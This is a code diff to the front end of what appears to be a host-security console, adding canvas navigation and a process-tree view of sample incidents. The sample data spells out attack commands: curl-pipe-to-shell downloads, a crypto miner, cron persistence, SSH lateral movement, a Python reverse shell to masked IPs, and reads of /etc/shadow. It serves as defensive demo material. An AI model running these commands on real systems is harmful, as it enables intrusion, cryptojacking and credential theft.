+                <button type="button" class="hg-fold" aria-label="{{ls.hg.foldN}}" title="{{ls.hg.foldN}}" onClick="{{ls.hg.foldT}}"><svg class="{{ls.hg.foldC}}" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M6 9l6 6 6-6"></path></svg></button></div>
+              <sc-if value="{{ls.hg.open}}" hint-placeholder-val="{{true}}"><div class="hg-db">
+                <sc-if value="{{ls.hg.dTr}}" hint-placeholder-val="{{true}}"><div class="hg-tr"><div class="hg-ax"><span class="hg-axl">{{ls.hg.axL}}</span><div class="hg-axt"><sc-for list="{{ls.hg.ticks}}" as="x" hint-placeholder-count="5"><span style="{{x.st}}">{{x.t}}</span></sc-for></div></div>
+                  <sc-for list="{{ls.hg.rows}}" as="r" hint-placeholder-count="6"><div class="{{r.c}}" onClick="{{r.t}}"><span class="hg-trl"><i class="{{r.ic}}" aria-hidden="true"></i><b>{{r.n}}</b><small>{{r.s}}</small></span><span class="hg-trk"><sc-for list="{{ls.hg.ticks}}" as="x" hint-placeholder-count="5"><i class="hg-gl" style="{{x.st}}"></i></sc-for><sc-if value="{{r.bar}}" hint-placeholder-val="{{false}}"><i class="{{r.bc}}" style="{{r.bst}}"></i></sc-if><sc-for list="{{r.pts}}" as="p" hint-placeholder-count="1"><button type="button" class="{{p.c}}" style="{{p.st}}" title="{{p.tt}}" onClick="{{p.t}}" onMouseEnter="{{p.he}}" onMouseLeave="{{ls.hx}}"><span>{{p.n}}</span></button></sc-for></span></div></sc-for></div></sc-if>
+                <sc-if value="{{ls.hg.dAl}}" hint-placeholder-val="{{false}}"><div class="hu-tlb hg-al"><sc-for list="{{ls.alerts}}" as="x" hint-placeholder-count="6"><button type="button" class="{{x.c}}" onClick="{{x.t}}" onMouseEnter="{{x.he}}" onMouseLeave="{{ls.hx}}"><time>{{x.tm}}</time><i class="{{x.dc}}"></i><span class="hu-tm"><span class="hu-tmh"><b>{{x.n}}</b><small>{{x.stg}} · {{x.ak}}</small></span><code>{{x.d}}</code></span><span class="hu-tp">{{x.pr}}</span><span class="{{x.sc}}">{{x.st}}</span></button></sc-for></div></sc-if>
+              </div></sc-if></div>
+          </div>
         </section>
         <section class="kc-card hu-r" aria-label="节点详情与证据"><div class="hu-rh"><b>节点详情与证据</b><sc-if value="{{ls.nd.hasSt}}" hint-placeholder-val="{{true}}"><span class="{{ls.nd.stC}}">{{ls.nd.st}}</span></sc-if><span class="hd-dw hu-nw"><button type="button" class="kc-dd hu-nop" aria-haspopup="menu" aria-expanded="{{ls.nopE}}" onClick="{{ls.nopT}}"><b>节点操作</b><svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 13.17l4.95-4.95 1.41 1.41L12 16 5.64 9.64l1.41-1.41z"></path></svg></button>
             <sc-if value="{{ls.nopOn}}" hint-placeholder-val="{{false}}"><span class="hd-dm" onClick="{{ls.nopT}}"></span><div class="hu-menu" role="menu"><p class="hu-mh">{{ls.nd.n}} · {{ls.nd.s}}</p><small>查询（立即执行）</small><sc-for list="{{ls.nq}}" as="x" hint-placeholder-count="2"><button type="button" role="menuitem" onClick="{{x.t}}"><span>{{x.n}}</span></button></sc-for>
@@ -1599,7 +1972,52 @@ class Component extends DCLogic {
   __di(n) { const k = {"服务器": "idc", "应用加速": "scdn", "WAAP 全站防护": "waf", "弹性云服务器": "idc", "裸金属服务器": "idc", "DDoS 高防 IP": "ddos", "游戏盾": "game", "SCDN": "scdn", "Web 应用防火墙": "waf", "SSL 证书": "ssl", "漏洞扫描 VSS": "vss", "漏洞扫描": "vss", "德迅安全卫士": "host", "德迅零域": "zero", "德迅蜂巢": "hive", "德迅猎鹰": "falcon", "德迅云眼": "eye", "德迅云图": "tu", "态势感知": "situ", "等保合规": "djbh", "等保咨询": "djbh", "日志审计": "log", "数据库审计": "db", "应用加固": "harden", "身份核验": "idv", "服务器租用": "idc", "云服务器": "ecs", "弹性云": "elastic", "裸金属": "metal", "机柜托管": "rack", "我的订单": "order", "发票管理": "invoice", "我的工单": "ticket", "成员管理": "member", "SCDN · 域名管理": "scdn", "费用": "order", "用户中心": "member", "付款管理": "order", "申请开票": "invoice"}[n]; return k ? 'dt dt-' + k : ''; }
 
   /* top70 */
-  componentDidMount() { if (document.querySelectorAll('.kc-top').length !== 1) return; this._tk = (e) => { if ((e.ctrlKey || e.metaKey) && (e.key === 'k' || e.key === 'K')) { e.preventDefault(); this.setState({ dd: 'srch', gq: '' }); } else if (e.key === 'Escape' && (this.state || {}).dd) this.setState({ dd: '' }); }; document.addEventListener('keydown', this._tk); }
+  /* hg 画布交互：拖拽平移、滚轮平移 / ⌘Ctrl+滚轮缩放、工具栏、底部面板拉伸、Esc 退出全屏 */
+  _hgInit() { if (this._hgOn) return; this._hgOn = 1; const self = this;
+    const vpOf = (t) => t && t.closest && t.closest('.hg-vp');
+    this._hgPD = (e) => { const mm = e.target.closest && e.target.closest('.hg-mm svg'); if (mm && e.button === 0) { self._hgDr = { t: 'mm', svg: mm, vp: mm.closest('.hg-vp') }; self._hgMmGo(self._hgDr, e); e.preventDefault(); return; }
+      const tl = e.target.closest && e.target.closest('.hgt-tl'); if (tl && e.button === 0 && !e.target.closest('.hgt-trr')) { const r = tl.getBoundingClientRect(); self._hgDr = { t: 'tl', tl, r, x0: e.clientX - r.left, x1: e.clientX - r.left }; tl.setAttribute('data-sel', ''); self._hgTlDraw(self._hgDr); e.preventDefault(); return; }
+      const g = e.target.closest && e.target.closest('.hg-grip'); if (g) { self._hgDr = { t: 'dock', y0: e.clientY, h0: self._hgDH || 200, hg: g.closest('.hg') }; g.closest('.hg').setAttribute('data-rs', ''); e.preventDefault(); return; }
+      const vp = vpOf(e.target); if (!vp || e.button !== 0 || e.target.closest('.hg-card,.hg-ui')) return; self._hgDr = { t: 'pan', x0: e.clientX, y0: e.clientY, v0: Object.assign({}, self._hgCur(vp)), vp, mv: 0 }; vp.setAttribute('data-pan', ''); };
+    this._hgPM = (e) => { const d = self._hgDr; if (!d) return; if (d.t === 'mm') { self._hgMmGo(d, e); return; } if (d.t === 'tl') { d.x1 = Math.max(0, Math.min(d.r.width, e.clientX - d.r.left)); self._hgTlDraw(d); return; } if (d.t === 'dock') { const h = Math.max(120, Math.min(460, d.h0 - (e.clientY - d.y0))); self._hgDH = h; d.hg.style.setProperty('--hg-dh', h + 'px'); return; }
+      const dx = e.clientX - d.x0, dy = e.clientY - d.y0; if (Math.abs(dx) + Math.abs(dy) > 3) d.mv = 1; if (d.mv) self._hgSet(d.vp, { x: d.v0.x + dx, y: d.v0.y + dy, z: d.v0.z }); };
+    this._hgPU = () => { const d = self._hgDr; self._hgDr = null; if (!d) return; if (d.t === 'mm') return; if (d.t === 'tl') { d.tl.removeAttribute('data-sel'); const a = Math.min(d.x0, d.x1), b = Math.max(d.x0, d.x1); if (b - a > 6 && self._hgTrSet) { const A0 = +d.tl.dataset.a0, A1 = +d.tl.dataset.a1; self._hgTrSet(A0 + (A1 - A0) * a / d.r.width, A0 + (A1 - A0) * b / d.r.width); } return; } if (d.t === 'pan') { d.vp.removeAttribute('data-pan'); if (!d.mv && (self.state || {}).huN) self.setState({ huN: '' }); } else { d.hg.removeAttribute('data-rs'); self.setState({ hgT: Date.now() }); } };
+    this._hgWh = (e) => { const vp = vpOf(e.target); if (!vp) return; const fsM = vp.closest('.hg').classList.contains('fs');
+      if (!fsM && !(e.ctrlKey || e.metaKey)) { const h = vp.querySelector('.hg-hint'); if (h) { h.classList.add('on'); clearTimeout(self._hgHt); self._hgHt = setTimeout(() => h.classList.remove('on'), 1400); } return; }
+      e.preventDefault(); const v = self._hgCur(vp);
+      if (e.ctrlKey || e.metaKey) { const r = vp.getBoundingClientRect(); const z = Math.max(0.2, Math.min(1.6, v.z * Math.exp(-e.deltaY * 0.0022))); const px = e.clientX - r.left, py = e.clientY - r.top; self._hgSet(vp, { x: px - (px - v.x) * z / v.z, y: py - (py - v.y) * z / v.z, z }); }
+      else self._hgSet(vp, { x: v.x - e.deltaX, y: v.y - e.deltaY, z: v.z }); };
+    this._hgKy = (e) => { if (e.target && e.target.tagName === 'INPUT') return; if (e.key === 'Escape' && (self.state || {}).hgFs) self.setState({ hgFs: false }); };
+    document.addEventListener('pointerdown', this._hgPD); document.addEventListener('pointermove', this._hgPM); document.addEventListener('pointerup', this._hgPU);
+    document.addEventListener('wheel', this._hgWh, { passive: false }); document.addEventListener('keydown', this._hgKy);
+    setTimeout(() => this._hgSync(), 80); }
+  _hgAct(el, a) { const vp = el && el.closest && el.closest('.hg') && el.closest('.hg').querySelector('.hg-vp'); if (!vp) return; const v = this._hgCur(vp); const r = vp.getBoundingClientRect();
+    if (a === 'fit') { this._hgSet(vp, this._hgFit(vp, true), 1); return; }
+    if (a === 'loc') { this._hgSet(vp, { x: r.width / 2 - (+vp.dataset.sx) * v.z, y: (r.height - 12) / 2 - (+vp.dataset.sy) * v.z, z: v.z }, 1); return; }
+    const z = a === 'one' ? 1 : Math.max(0.2, Math.min(1.6, v.z * (a === 'in' ? 1.2 : 1 / 1.2))); const cx = r.width / 2, cy = r.height / 2; this._hgSet(vp, { x: cx - (cx - v.x) * z / v.z, y: cy - (cy - v.y) * z / v.z, z }, 1); }
+  componentDidUpdate() { this._hgSync(); const g0 = this._hgGo; const tb = document.querySelector('.hg .hgt-bd');
+    if (tb) { if (g0 && g0 !== this._hgGone) { this._hgGone = g0; const el = [...tb.querySelectorAll('.hgt-r')].find((c) => c.getAttribute('data-id') === g0); if (el) el.scrollIntoView({ block: 'center', behavior: 'smooth' }); } if (!g0) this._hgGone = ''; return; }
+    const vp = document.querySelector('.hg .hg-vp'); if (!vp) return; this._hgMm(vp, this._hgCur(vp));
+    const g = this._hgGo; if (g && g !== this._hgGone) { this._hgGone = g; const el = [...vp.querySelectorAll('.hg-card')].find((c) => c.getAttribute('data-id') === g); if (el) { const r = vp.getBoundingClientRect(); const v = this._hgCur(vp); const z = Math.max(v.z, 0.8); const cx = parseFloat(el.style.left) + el.offsetWidth / 2, cy = parseFloat(el.style.top) + el.offsetHeight / 2; this._hgSet(vp, { x: r.width / 2 - cx * z, y: r.height / 2 - cy * z, z }, 1); } }
+    if (!g) this._hgGone = ''; }
+  _hgMmGo(d, e) { const svg = d.svg, vp = d.vp; if (!svg || !vp) return; const pt = svg.createSVGPoint(); pt.x = e.clientX; pt.y = e.clientY; const w = pt.matrixTransform(svg.getScreenCTM().inverse()); const v = this._hgCur(vp); const r = vp.getBoundingClientRect(); this._hgSet(vp, { x: r.width / 2 - w.x * v.z, y: r.height / 2 - w.y * v.z, z: v.z }); }
+  _hgTlDraw(d) { const s = d.tl.querySelector('.hgt-sel'); if (!s) return; s.style.left = Math.min(d.x0, d.x1) + 'px'; s.style.width = Math.abs(d.x1 - d.x0) + 'px'; }
+  _hgMm(vp, v) { const m = vp.querySelector('.hg-mmv'); if (!m) return; const r = vp.getBoundingClientRect(); m.setAttribute('x', -v.x / v.z); m.setAttribute('y', -v.y / v.z); m.setAttribute('width', r.width / v.z); m.setAttribute('height', r.height / v.z); }
+  _hgCur(vp) { const k = vp.closest('.hg').getAttribute('data-k'); return this._hgView && this._hgView.k === k && this._hgView.z ? this._hgView : { k, x: 24, y: 24, z: 0.9 }; }
+  _hgSet(vp, v, anim) { const k = vp.closest('.hg').getAttribute('data-k'); this._hgView = { k, x: v.x, y: v.y, z: v.z }; const w = vp.querySelector('.hg-world'); if (!w) return;
+    if (anim) { w.style.transition = 'transform .45s cubic-bezier(.2,.8,.2,1)'; vp.style.transition = 'background-position .45s cubic-bezier(.2,.8,.2,1),background-size .45s cubic-bezier(.2,.8,.2,1)'; setTimeout(() => { w.style.transition = ''; vp.style.transition = ''; }, 480); }
+    w.style.transform = 'translate(' + v.x + 'px,' + v.y + 'px) scale(' + v.z + ')'; vp.style.backgroundPosition = v.x + 'px ' + v.y + 'px'; vp.style.backgroundSize = (20 * v.z) + 'px ' + (20 * v.z) + 'px';
+    vp.classList.toggle('lod', v.z < 0.62); vp.classList.toggle('lod2', v.z < 0.42); this._hgMm(vp, v);
+    const zb = vp.querySelector('.hg-zm'); if (zb) zb.textContent = Math.round(v.z * 100) + '%';
+    clearTimeout(this._hgTm); this._hgTm = setTimeout(() => this.setState({ hgT: Date.now() }), 240); }
+  _hgFit(vp, full) { const r = vp.getBoundingClientRect(); const W = +vp.dataset.w, H = +vp.dataset.h; const top = vp.querySelector('.hg-qb') ? 80 : 36, bot = 52; const vw = r.width, vh = r.height - top - bot;
+    let z = Math.min(1, vw / W, vh / H);
+    if (full || z >= 0.8) { z = Math.max(0.22, z); return { x: (vw - W * z) / 2, y: top + (vh - H * z) / 2, z }; }
+    z = 0.86; const rx = +vp.dataset.rx, ry = +vp.dataset.ry;
+    if (vp.dataset.o === 'h') return { x: 0, y: Math.min(top, top + vh * 0.42 - ry * z), z };
+    return { x: Math.min(0, Math.max(vw - W * z, vw / 2 - rx * z)), y: top - 12, z }; }
+  _hgSync() { const hg = document.querySelector('.hg'); if (!hg) return; const k = hg.getAttribute('data-k'); if (this._hgView && this._hgView.k === k) return; const vp = hg.querySelector('.hg-vp'); if (!vp || !vp.getBoundingClientRect().width) return; this._hgSet(vp, this._hgFit(vp, hg.classList.contains('fs'))); }
+  componentDidMount() { this._hgInit(); if (document.querySelectorAll('.kc-top').length !== 1) return; this._tk = (e) => { if ((e.ctrlKey || e.metaKey) && (e.key === 'k' || e.key === 'K')) { e.preventDefault(); this.setState({ dd: 'srch', gq: '' }); } else if (e.key === 'Escape' && (this.state || {}).dd) this.setState({ dd: '' }); }; document.addEventListener('keydown', this._tk); }
   componentWillUnmount() { if (this._tk) document.removeEventListener('keydown', this._tk); }
   _top() {
     const st = this.state || {}; const dd = st.dd || ''; const ev = (e) => { if (e && e.preventDefault) e.preventDefault(); };
@@ -2487,14 +2905,200 @@ class Component extends DCLogic {
         p7: ['sshd', 812, '', 'root', '/usr/sbin/sshd -D', '已签名 · Debian', '0d9e…77a1'], p8: ['sshd', 3310, 'p7', 'root', 'sshd: deploy [priv]', '已签名 · Debian', '0d9e…77a1'], p9: ['bash', 3318, 'p8', 'deploy', '-bash', '已签名 · Debian', '6a4f…2be0'],
         p10: ['cat', 3340, 'p9', 'deploy', 'cat /etc/shadow', '已签名 · Debian', 'f12c…8d33'], p11: ['tee', 3361, 'p9', 'deploy', 'tee -a /root/.ssh/authorized_keys', '已签名 · Debian', '9e7b…c410'],
         j1: ['java', 2201, '', 'tomcat', '/usr/bin/java -jar /opt/app/order-service.jar', '已签名 · Oracle', '8c1d…2e07'], j2: ['sh', 5520, 'j1', 'tomcat', 'sh -c echo Y3VybCA0NS4xMy4qKi44L3guc2g= | base64 -d | sh', '已签名 · CentOS', '1b9f…aa30'], j3: ['curl', 5523, 'j2', 'tomcat', 'curl 45.13.**.8/x.sh', '已签名 · CentOS', 'c3d8…0b17'],
-        k1: ['sshd', 990, '', 'root', 'sshd: ops [priv]', '已签名 · Debian', '0d9e…77a1'], k2: ['bash', 4021, 'k1', 'ops', 'bash -c "wget -q 222.186.**.71/k -O /tmp/k; chmod +x /tmp/k"', '已签名 · Debian', '6a4f…2be0'] };
+        k1: ['sshd', 990, '', 'root', 'sshd: ops [priv]', '已签名 · Debian', '0d9e…77a1'], k2: ['bash', 4021, 'k1', 'ops', 'bash -c "wget -q 222.186.**.71/k -O /tmp/k; chmod +x /tmp/k"', '已签名 · Debian', '6a4f…2be0'],
+        q1: ['cron', 811, '', 'root', '/usr/sbin/cron -f', '已签名 · Debian', '4b1e…09a2', '09:00:00'],
+        q2: ['sh', 9101, 'q1', 'root', 'sh -c "curl -fsSL 91.215.**.4/up.sh | sh"', '已签名 · Debian', '1b9f…aa30', '09:41:02'],
+        q3: ['bash', 9102, 'q2', 'root', 'bash -s  # up.sh', '已签名 · Debian', '6a4f…2be0', '09:41:03'],
+        q10: ['curl', 9110, 'q3', 'root', 'curl -s -o /var/tmp/.u/p00 91.215.**.4/p/00', '已签名 · Debian', 'c3d8…0b17', '09:41:05'],
+        q11: ['curl', 9111, 'q3', 'root', 'curl -s -o /var/tmp/.u/p01 91.215.**.4/p/01', '已签名 · Debian', 'c3d8…0b17', '09:41:09'],
+        q12: ['curl', 9112, 'q3', 'root', 'curl -s -o /var/tmp/.u/p02 91.215.**.4/p/02', '已签名 · Debian', 'c3d8…0b17', '09:41:13'],
+        q13: ['curl', 9113, 'q3', 'root', 'curl -s -o /var/tmp/.u/p03 91.215.**.4/p/03', '已签名 · Debian', 'c3d8…0b17', '09:41:17'],
+        q14: ['curl', 9114, 'q3', 'root', 'curl -s -o /var/tmp/.u/p04 91.215.**.4/p/04', '已签名 · Debian', 'c3d8…0b17', '09:41:21'],
+        q15: ['curl', 9115, 'q3', 'root', 'curl -s -o /var/tmp/.u/p05 91.215.**.4/p/05', '已签名 · Debian', 'c3d8…0b17', '09:41:25'],
+        q16: ['curl', 9116, 'q3', 'root', 'curl -s -o /var/tmp/.u/p06 91.215.**.4/p/06', '已签名 · Debian', 'c3d8…0b17', '09:41:29'],
+        q17: ['curl', 9117, 'q3', 'root', 'curl -s -o /var/tmp/.u/p07 91.215.**.4/p/07', '已签名 · Debian', 'c3d8…0b17', '09:41:33'],
+        q18: ['curl', 9118, 'q3', 'root', 'curl -s -o /var/tmp/.u/p08 91.215.**.4/p/08', '已签名 · Debian', 'c3d8…0b17', '09:41:37'],
+        q19: ['curl', 9119, 'q3', 'root', 'curl -s -o /var/tmp/.u/p09 91.215.**.4/p/09', '已签名 · Debian', 'c3d8…0b17', '09:41:41'],
+        q20: ['curl', 9120, 'q3', 'root', 'curl -s -o /var/tmp/.u/p10 91.215.**.4/p/10', '已签名 · Debian', 'c3d8…0b17', '09:41:45'],
+        q21: ['curl', 9121, 'q3', 'root', 'curl -s -o /var/tmp/.u/p11 91.215.**.4/p/11', '已签名 · Debian', 'c3d8…0b17', '09:41:49'],
+        q22: ['curl', 9122, 'q3', 'root', 'curl -s -o /var/tmp/.u/p12 91.215.**.4/p/12', '已签名 · Debian', 'c3d8…0b17', '09:41:53'],
+        q23: ['curl', 9123, 'q3', 'root', 'curl -s -o /var/tmp/.u/p13 91.215.**.4/p/13', '已签名 · Debian', 'c3d8…0b17', '09:41:57'],
+        q24: ['curl', 9124, 'q3', 'root', 'curl -s -o /var/tmp/.u/p14 91.215.**.4/p/14', '已签名 · Debian', 'c3d8…0b17', '09:42:01'],
+        q25: ['curl', 9125, 'q3', 'root', 'curl -s -o /var/tmp/.u/p15 91.215.**.4/p/15', '已签名 · Debian', 'c3d8…0b17', '09:42:05'],
+        q26: ['curl', 9126, 'q3', 'root', 'curl -s -o /var/tmp/.u/p16 91.215.**.4/p/16', '已签名 · Debian', 'c3d8…0b17', '09:42:09'],
+        q27: ['curl', 9127, 'q3', 'root', 'curl -s -o /var/tmp/.u/p17 91.215.**.4/p/17', '已签名 · Debian', 'c3d8…0b17', '09:42:13'],
+        q28: ['curl', 9128, 'q3', 'root', 'curl -s -o /var/tmp/.u/p18 91.215.**.4/p/18', '已签名 · Debian', 'c3d8…0b17', '09:42:17'],
+        q29: ['curl', 9129, 'q3', 'root', 'curl -s -o /var/tmp/.u/p19 91.215.**.4/p/19', '已签名 · Debian', 'c3d8…0b17', '09:42:21'],
+        q30: ['curl', 9130, 'q3', 'root', 'curl -s -o /var/tmp/.u/p20 91.215.**.4/p/20', '已签名 · Debian', 'c3d8…0b17', '09:42:25'],
+        q31: ['curl', 9131, 'q3', 'root', 'curl -s -o /var/tmp/.u/p21 91.215.**.4/p/21', '已签名 · Debian', 'c3d8…0b17', '09:42:29'],
+        q32: ['curl', 9132, 'q3', 'root', 'curl -s -o /var/tmp/.u/p22 91.215.**.4/p/22', '已签名 · Debian', 'c3d8…0b17', '09:42:33'],
+        q33: ['curl', 9133, 'q3', 'root', 'curl -s -o /var/tmp/.u/p23 91.215.**.4/p/23', '已签名 · Debian', 'c3d8…0b17', '09:42:37'],
+        q34: ['curl', 9134, 'q3', 'root', 'curl -s -o /var/tmp/.u/p24 91.215.**.4/p/24', '已签名 · Debian', 'c3d8…0b17', '09:42:41'],
+        q35: ['curl', 9135, 'q3', 'root', 'curl -s -o /var/tmp/.u/p25 91.215.**.4/p/25', '已签名 · Debian', 'c3d8…0b17', '09:42:45'],
+        q36: ['curl', 9136, 'q3', 'root', 'curl -s -o /var/tmp/.u/p26 91.215.**.4/p/26', '已签名 · Debian', 'c3d8…0b17', '09:42:49'],
+        q37: ['curl', 9137, 'q3', 'root', 'curl -s -o /var/tmp/.u/p27 91.215.**.4/p/27', '已签名 · Debian', 'c3d8…0b17', '09:42:53'],
+        q38: ['curl', 9138, 'q3', 'root', 'curl -s -o /var/tmp/.u/p28 91.215.**.4/p/28', '已签名 · Debian', 'c3d8…0b17', '09:42:57'],
+        q39: ['curl', 9139, 'q3', 'root', 'curl -s -o /var/tmp/.u/p29 91.215.**.4/p/29', '已签名 · Debian', 'c3d8…0b17', '09:43:01'],
+        q40: ['curl', 9140, 'q3', 'root', 'curl -s -o /var/tmp/.u/p30 91.215.**.4/p/30', '已签名 · Debian', 'c3d8…0b17', '09:43:05'],
+        q41: ['curl', 9141, 'q3', 'root', 'curl -s -o /var/tmp/.u/p31 91.215.**.4/p/31', '已签名 · Debian', 'c3d8…0b17', '09:43:09'],
+        q42: ['curl', 9142, 'q3', 'root', 'curl -s -o /var/tmp/.u/p32 91.215.**.4/p/32', '已签名 · Debian', 'c3d8…0b17', '09:43:13'],
+        q43: ['curl', 9143, 'q3', 'root', 'curl -s -o /var/tmp/.u/p33 91.215.**.4/p/33', '已签名 · Debian', 'c3d8…0b17', '09:43:17'],
+        q44: ['curl', 9144, 'q3', 'root', 'curl -s -o /var/tmp/.u/p34 91.215.**.4/p/34', '已签名 · Debian', 'c3d8…0b17', '09:43:21'],
+        q45: ['curl', 9145, 'q3', 'root', 'curl -s -o /var/tmp/.u/p35 91.215.**.4/p/35', '已签名 · Debian', 'c3d8…0b17', '09:43:25'],
+        q46: ['curl', 9146, 'q3', 'root', 'curl -s -o /var/tmp/.u/p36 91.215.**.4/p/36', '已签名 · Debian', 'c3d8…0b17', '09:43:29'],
+        q47: ['curl', 9147, 'q3', 'root', 'curl -s -o /var/tmp/.u/p37 91.215.**.4/p/37', '已签名 · Debian', 'c3d8…0b17', '09:43:33'],
+        q48: ['curl', 9148, 'q3', 'root', 'curl -s -o /var/tmp/.u/p38 91.215.**.4/p/38', '已签名 · Debian', 'c3d8…0b17', '09:43:37'],
+        q49: ['curl', 9149, 'q3', 'root', 'curl -s -o /var/tmp/.u/p39 91.215.**.4/p/39', '已签名 · Debian', 'c3d8…0b17', '09:43:41'],
+        q4: ['chmod', 9152, 'q3', 'root', 'chmod +x /var/tmp/.u/kdevd', '已签名 · Debian', '77c0…1e5d', '09:44:00'],
+        q8: ['pkill', 9153, 'q3', 'root', 'pkill -f "kdevtmpfsi|kinsing|xmrig"', '已签名 · Debian', '2d4a…8f61', '09:44:02'],
+        q7: ['iptables', 9154, 'q3', 'root', 'iptables -F', '已签名 · Debian', '9a13…c7b4', '09:44:03'],
+        q5: ['kdevd', 9160, 'q3', 'root', '/var/tmp/.u/kdevd -o pool.**:3333 --donate-level 1 -B', '无签名', 'e5f1…3a90', '09:44:05'],
+        q60: ['kdevd', 9161, 'q5', 'root', '/var/tmp/.u/kdevd --worker 0', '无签名', 'e5f1…3a90', '09:44:06'],
+        q61: ['kdevd', 9162, 'q5', 'root', '/var/tmp/.u/kdevd --worker 1', '无签名', 'e5f1…3a90', '09:44:06'],
+        q62: ['kdevd', 9163, 'q5', 'root', '/var/tmp/.u/kdevd --worker 2', '无签名', 'e5f1…3a90', '09:44:06'],
+        q63: ['kdevd', 9164, 'q5', 'root', '/var/tmp/.u/kdevd --worker 3', '无签名', 'e5f1…3a90', '09:44:06'],
+        q64: ['kdevd', 9165, 'q5', 'root', '/var/tmp/.u/kdevd --worker 4', '无签名', 'e5f1…3a90', '09:44:06'],
+        q65: ['kdevd', 9166, 'q5', 'root', '/var/tmp/.u/kdevd --worker 5', '无签名', 'e5f1…3a90', '09:44:06'],
+        q66: ['kdevd', 9167, 'q5', 'root', '/var/tmp/.u/kdevd --worker 6', '无签名', 'e5f1…3a90', '09:44:06'],
+        q67: ['kdevd', 9168, 'q5', 'root', '/var/tmp/.u/kdevd --worker 7', '无签名', 'e5f1…3a90', '09:44:06'],
+        q6: ['crontab', 9170, 'q3', 'root', '(crontab -l; echo "*/10 * * * * curl -fsSL 91.215.**.4/up.sh|sh") | crontab -', '已签名 · Debian', '55b2…e6f3', '09:44:20'],
+        q9: ['ssh', 9180, 'q3', 'root', 'ssh -o StrictHostKeyChecking=no root@10.0.2.31 "curl -fsSL 91.215.**.4/up.sh|sh"', '已签名 · Debian', '0d9e…77a1', '09:48:30'],
+        q91: ['ssh', 9181, 'q3', 'root', 'ssh -o BatchMode=yes root@10.0.2.32 true', '已签名 · Debian', '0d9e…77a1', '09:48:31'],
+        q70: ['run-parts', 9050, 'q1', 'root', 'run-parts /etc/cron.hourly', '已签名 · Debian', '31aa…d0c2', '09:00:01'],
+        q71: ['logrotate', 9051, 'q70', 'root', '/usr/sbin/logrotate /etc/logrotate.conf', '已签名 · Debian', '8e02…44b9', '09:00:01'],
+        q72: ['debian-sa1', 9052, 'q1', 'root', 'debian-sa1 1 1', '已签名 · Debian', 'f7c3…5a18', '09:40:01'],
+        w10: ['php-fpm', 1100, '', 'root', 'php-fpm: master process (/etc/php/8.1/fpm/php-fpm.conf)', '已签名 · Debian', '—', '08:02:00'],
+        w11: ['php-fpm', 1101, 'w10', 'www-data', 'php-fpm: pool www', '已签名 · Debian', '—', '08:02:00'],
+        w12: ['php-fpm', 1102, 'w10', 'www-data', 'php-fpm: pool www', '已签名 · Debian', '—', '08:02:00'],
+        w13: ['php-fpm', 1103, 'w10', 'www-data', 'php-fpm: pool www', '已签名 · Debian', '—', '08:02:00'],
+        w14: ['php-fpm', 1104, 'w10', 'www-data', 'php-fpm: pool www', '已签名 · Debian', '—', '08:02:00'],
+        w15: ['php-fpm', 1105, 'w10', 'www-data', 'php-fpm: pool www', '已签名 · Debian', '—', '08:02:00'],
+        w16: ['php-fpm', 1106, 'w10', 'www-data', 'php-fpm: pool www', '已签名 · Debian', '—', '08:02:00'],
+        w17: ['php-fpm', 1107, 'w10', 'www-data', 'php-fpm: pool www', '已签名 · Debian', '—', '08:02:00'],
+        w18: ['php-fpm', 1108, 'w10', 'www-data', 'php-fpm: pool www', '已签名 · Debian', '—', '08:02:00'],
+        w19: ['php-fpm', 1109, 'w10', 'www-data', 'php-fpm: pool www', '已签名 · Debian', '—', '08:02:00'],
+        w20: ['php-fpm', 1110, 'w10', 'www-data', 'php-fpm: pool www', '已签名 · Debian', '—', '08:02:00'],
+        w21: ['php-fpm', 1111, 'w10', 'www-data', 'php-fpm: pool www', '已签名 · Debian', '—', '08:02:00'],
+        w22: ['php-fpm', 1112, 'w10', 'www-data', 'php-fpm: pool www', '已签名 · Debian', '—', '08:02:00'],
+        w23: ['php-fpm', 1113, 'w10', 'www-data', 'php-fpm: pool www', '已签名 · Debian', '—', '08:02:00'],
+        w24: ['php-fpm', 1114, 'w10', 'www-data', 'php-fpm: pool www', '已签名 · Debian', '—', '08:02:00'],
+        w25: ['php-fpm', 1115, 'w10', 'www-data', 'php-fpm: pool www', '已签名 · Debian', '—', '08:02:00'],
+        w26: ['php-fpm', 1116, 'w10', 'www-data', 'php-fpm: pool www', '已签名 · Debian', '—', '08:02:00'],
+        w27: ['php-fpm', 1117, 'w10', 'www-data', 'php-fpm: pool www', '已签名 · Debian', '—', '08:02:00'],
+        w28: ['php-fpm', 1118, 'w10', 'www-data', 'php-fpm: pool www', '已签名 · Debian', '—', '08:02:00'],
+        w29: ['php-fpm', 1119, 'w10', 'www-data', 'php-fpm: pool www', '已签名 · Debian', '—', '08:02:00'],
+        w30: ['php-fpm', 1120, 'w10', 'www-data', 'php-fpm: pool www', '已签名 · Debian', '—', '08:02:00'],
+        w31: ['sh', 23101, 'w11', 'www-data', 'sh -c "cd /var/www/html/upload;python3 -c ..."', '已签名 · Debian', '—', '10:02:11'],
+        w32: ['python3', 23102, 'w31', 'www-data', 'python3 -c \'import socket,pty;s=socket.socket();s.connect(("103.75.**.9",443));pty.spawn("bash")\'', '已签名 · Debian', '—', '10:02:12'],
+        w33: ['bash', 23103, 'w32', 'www-data', 'bash -i', '已签名 · Debian', '—', '10:02:13'],
+        w100: ['whoami', 23110, 'w33', 'www-data', 'whoami', '已签名 · Debian', '—', '10:02:20'],
+        w101: ['id', 23111, 'w33', 'www-data', 'id', '已签名 · Debian', '—', '10:02:26'],
+        w102: ['uname', 23112, 'w33', 'www-data', 'uname -a', '已签名 · Debian', '—', '10:02:32'],
+        w103: ['ps', 23113, 'w33', 'www-data', 'ps aux', '已签名 · Debian', '—', '10:02:38'],
+        w104: ['netstat', 23114, 'w33', 'www-data', 'netstat -antp', '已签名 · Debian', '—', '10:02:44'],
+        w105: ['ls', 23115, 'w33', 'www-data', 'ls -la /home', '已签名 · Debian', '—', '10:02:50'],
+        w106: ['ls', 23116, 'w33', 'www-data', 'ls -la /var/www', '已签名 · Debian', '—', '10:02:56'],
+        w107: ['ls', 23117, 'w33', 'www-data', 'ls -la /opt', '已签名 · Debian', '—', '10:03:02'],
+        w108: ['ls', 23118, 'w33', 'www-data', 'ls -la /tmp', '已签名 · Debian', '—', '10:03:08'],
+        w109: ['ls', 23119, 'w33', 'www-data', 'ls -la /root', '已签名 · Debian', '—', '10:03:14'],
